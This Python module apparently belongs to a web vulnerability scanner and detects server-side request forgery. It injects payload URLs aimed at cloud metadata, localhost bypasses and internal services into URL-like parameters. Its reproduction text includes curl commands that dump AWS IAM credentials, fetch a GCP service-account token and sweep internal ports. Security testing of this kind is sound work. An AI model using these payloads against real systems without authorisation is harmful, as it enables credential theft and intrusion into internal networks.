"""SSRF (Server-Side Request Forgery) detection module.

Tests URL-like parameters by injecting cloud metadata and internal service
endpoints.  Detects successful SSRF via response content matching.
"""

import concurrent.futures
import re
from typing import Dict, List, Optional, Set

from .base import BaseModule, Finding


# ---------------------------------------------------------------------------
# SSRF probe targets
# ---------------------------------------------------------------------------
_TARGETS = [
    # --- Cloud metadata ---
    ("AWS IMDSv1",         "http://169.254.169.254/latest/meta-data/"),
    ("AWS IAM Credentials","http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("AWS User-Data",      "http://169.254.169.254/latest/user-data"),
    ("GCP Metadata",       "http://metadata.google.internal/computeMetadata/v1/?recursive=true"),
    ("Azure IMDS",         "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("Oracle Cloud",       "http://169.254.169.254/opc/v1/instance/"),
    # --- Localhost bypasses ---
    ("Localhost",          "http://localhost/"),
    ("127.0.0.1",          "http://127.0.0.1/"),
    ("IPv6 Loopback",      "http://[::1]/"),
    ("Decimal IP",         "http://2130706433/"),       # 127.0.0.1 as int
    ("Hex IP",             "http://0x7f000001/"),
    ("Octal IP",           "http://0177.0.0.1/"),
    ("DNS Rebind",         "http://localtest.me/"),
    ("Short URL",          "http://0.0.0.0/"),
    # --- Common internal services ---
    ("Redis",              "http://127.0.0.1:6379/"),
    ("Elasticsearch",      "http://127.0.0.1:9200/"),
    ("Memcached",          "http://127.0.0.1:11211/"),
    ("MongoDB",            "http://127.0.0.1:27017/"),
    ("Consul",             "http://127.0.0.1:8500/v1/agent/self"),
    ("Kubernetes API",     "https://10.0.0.1:6443/api"),
    ("Kubelet",            "http://127.0.0.1:10255/pods"),
    ("Docker Socket",      "http://127.0.0.1:2375/info"),
    ("Internal HTTP 8080", "http://127.0.0.1:8080/"),
    ("Internal HTTP 8888", "http://127.0.0.1:8888/"),
]

# Patterns that indicate the server fetched the target
_INDICATORS = [
    # AWS
    r"\bami-id\b", r"\binstance-id\b", r"\blocal-ipv4\b",
    r"security-credentials", r"iam/security-credentials",
    # GCP
    r"computeMetadata", r"serviceAccount", r"project-id",
    # Azure
    r"subscriptionId", r"osProfile", r"storageProfile",
    # Generic internal
    r"127\.0\.0\.1", r"localhost",
    r'"hostname":', r'"private_ip"',
    # Redis
    r"\+OK\b", r"-ERR\b",
    # Elasticsearch
    r"\"cluster_name\"", r"\"number_of_nodes\"",
    # Kubernetes
    r'"apiVersion":\s*"v1"', r'"kind":\s*"NodeList"',
    # Docker
    r'"DockerRootDir"', r'"ServerVersion"',
    # Memcached
    r"\bSTAT\s+version\b",
]

_COMPILED_INDICATORS = [re.compile(p, re.IGNORECASE) for p in _INDICATORS]

# Parameter name hints that suggest a URL-accepting field
_URL_PARAM_HINTS: Set[str] = {
    "url", "link", "src", "source", "path", "target", "dest",
    "destination", "redirect", "uri", "next", "back", "forward",
    "page", "host", "endpoint", "fetch", "load", "read", "file",
    "resource", "goto", "callback", "proxy", "mirror", "origin",
    "base", "domain", "service", "api", "request", "return",
    "ref", "referrer", "referer", "open", "url2", "image",
    "avatar", "logo", "icon", "thumb", "thumbnail",
}


def _matches_any(text: str) -> Optional[str]:
    """Return the first matching indicator pattern or None."""
    for pat in _COMPILED_INDICATORS:
        m = pat.search(text)
        if m:
            return m.group(0)
    return None


class SSRFScanner(BaseModule):
    NAME = "ssrf"

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        findings: List[Finding] = []

        # Only fuzz parameters that look URL-accepting
        value = params.get(param_name, "")
        name_lower = param_name.lower().replace("-", "_").replace(".", "_")

        is_url_param = (
            any(hint in name_lower for hint in _URL_PARAM_HINTS)
            or re.match(r"https?://", value)
            or (value.startswith("/") and len(value) > 1)
        )
        if not is_url_param:
            return findings

        # Baseline for size comparison
        baseline_resp = self.http.get(url, params=params)
        baseline_size = len(baseline_resp.text) if baseline_resp else 0
        baseline_status = baseline_resp.status_code if baseline_resp else 0

        def _probe(label: str, target_url: str) -> Optional[Finding]:
            test_params = {**params, param_name: target_url}
            resp = (
                self.http.get(url, params=test_params)
                if method == "GET"
                else self.http.post(url, data=test_params)
            )
            if resp is None:
                return None

            body = resp.text[:8192]
            hit = _matches_any(body)

            # Confidence bump: 200 when baseline wasn't + larger body
            if hit is None:
                if (resp.status_code == 200 and baseline_status != 200
                        and len(resp.text) > baseline_size + 100):
                    hit = "(unexpected 200 response with larger body)"

            if hit is None:
                return None

            return Finding(
                vuln_type="SSRF (Server-Side Request Forgery)",
                url=url,
                method=method,
                parameter=param_name,
                payload=target_url,
                evidence=f"Response contains '{hit}' after injecting {target_url} ({label})",
                confidence=(
                    "high"
                    if re.search(r"ami-id|cluster_name|DockerRootDir", hit, re.I)
                    else "medium"
                ),
                details=(
                    f"Parameter '{param_name}' is vulnerable to SSRF. "
                    f"The server fetched '{target_url}' ({label}) and the "
                    f"response contains indicator: '{hit}'. "
                    "Attackers can pivot to internal services, exfiltrate "
                    "cloud credentials, and bypass firewall rules."
                ),
                reproduction=(
                    f"# 1. Confirm SSRF:\n"
                    f'$ curl -s "{url}?{param_name}={target_url}"\n\n'
                    f"# 2. Dump AWS credentials (if AWS environment):\n"
                    f'$ curl -s "{url}?{param_name}='
                    f'http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n\n'
                    f"# 3. Try GCP metadata:\n"
                    f'$ curl -s "{url}?{param_name}='
                    f"http://metadata.google.internal/computeMetadata/v1/instance/"
                    f'service-accounts/default/token" -H "Metadata-Flavor: Google"\n\n'
                    f"# 4. Internal service pivot:\n"
                    f"$ for port in 22 3306 6379 9200 27017; do\n"
                    f'    curl -s "{url}?{param_name}=http://127.0.0.1:$port/" --max-time 2\n'
                    f"done"
                ),
            )

        # Probe all targets concurrently -- stop at first confirmed finding
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as exe:
            futs = {
                exe.submit(_probe, label, tgt): (label, tgt)
                for label, tgt in _TARGETS
            }
            for fut in concurrent.futures.as_completed(futs):
                result = fut.result()
                if result is not None:
                    findings.append(result)
                    # Cancel remaining futures (one finding per param is enough)
                    for pending in futs:
                        pending.cancel()
                    break

        return findings
